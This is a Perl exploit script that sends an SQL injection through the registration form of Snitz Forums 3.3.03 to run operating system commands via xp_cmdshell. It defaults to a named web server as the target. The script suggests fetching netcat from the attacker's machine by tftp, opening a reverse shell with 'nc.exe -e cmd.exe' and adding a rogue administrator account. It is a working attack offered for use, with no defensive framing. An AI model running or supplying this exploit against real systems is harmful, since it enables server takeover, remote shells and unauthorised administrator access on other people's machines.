#!/usr/bin/perl

use Socket;

print "\nRemote command execution against Snitz Forums 3.3.03 (and probably others).\n";
print "You accept full responsibility for your actions by using this script.\n";
print "INTERNAL USE ONLY!! DO NOT DISTRIBUTE!!\n";

print "\nWeb server? [www.enterthegame.com]: ";
my $webserver = <STDIN>;
chomp $webserver;
if( $webserver eq "" )
{
	$webserver = "www.enterthegame.com";
}

print "\nWeb server port? [80]: ";
my $port = <STDIN>;
chomp $port;
if( $port eq "" )
{
	$port = 80;
}

print "\nAbsolute path to \"register.asp\"? [/forum/register.asp]: ";
my $path = <STDIN>;
chomp $path;
if( $path eq "" )
{
	$path = "/forum/register.asp";
}

print "\nCommand to execute non-interactively\n";
print "     Example commands: tftp -i Your.IP.Here GET nc.exe\n";
print "                       nc.exe -e cmd.exe Your.IP.Here YourNetcatListeningPortHere\n";
print "     or:               net user h4x0r /add | net localgroup Administrators h4x0r /add\n";
print "Your command: ";
my $command = <STDIN>;
chomp $command;
$command =~ s/\ /\%20/g;

if( open_TCP( FILEHANDLE, $webserver, 80 ) == undef )
{
	print "Error connecting to $webserver\n";
	exit( 0 );
}
else
{
	my $data1 = $path . "\?mode\=DoIt";
	my $data2 = "Email\=\'\%20exec\%20master..xp_cmdshell\%20\'" . $command. "\'\%20--\&Name\=snitz";
	my $length = length( $data2 );

	print FILEHANDLE "POST $data1 HTTP/1.1\n";
	if( $port == 80 )
	{
		print FILEHANDLE "Host: $webserver\n";
	}
	else
	{
		print FILEHANDLE "Host: $webserver:$port\n";
	}
	print FILEHANDLE "Accept: */*\n";
	print FILEHANDLE "User-Agent: User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\n";
	print FILEHANDLE "Keep-Alive: 300\n";
	print FILEHANDLE "Referer: http:\/\/$webserver$path\?mode\=Register\n";
	print FILEHANDLE "Content-Type: application/x-www-form-urlencoded\n";
	print FILEHANDLE "Content-Length: $length\n\n";
	print FILEHANDLE "$data2";

	print "\nSQL injection command sent. If you are waiting for a shell on your listening\n";
	print "netcat, hit \"enter\" a couple of times to be safe.\n\n";

	close( FILEHANDLE );
}

sub open_TCP
{
	my( $FS, $dest, $port ) = @_;

	my $proto = getprotobyname( 'tcp' );
	socket( $FS, PF_INET, SOCK_STREAM, $proto );
	my $sin = sockaddr_in( $port, inet_aton( $dest ));
	connect( $FS, $sin ) || return undef;

	my $old_fh = select( $FS );
	$| = 1;
	select( $old_fh );
	return 1;
}
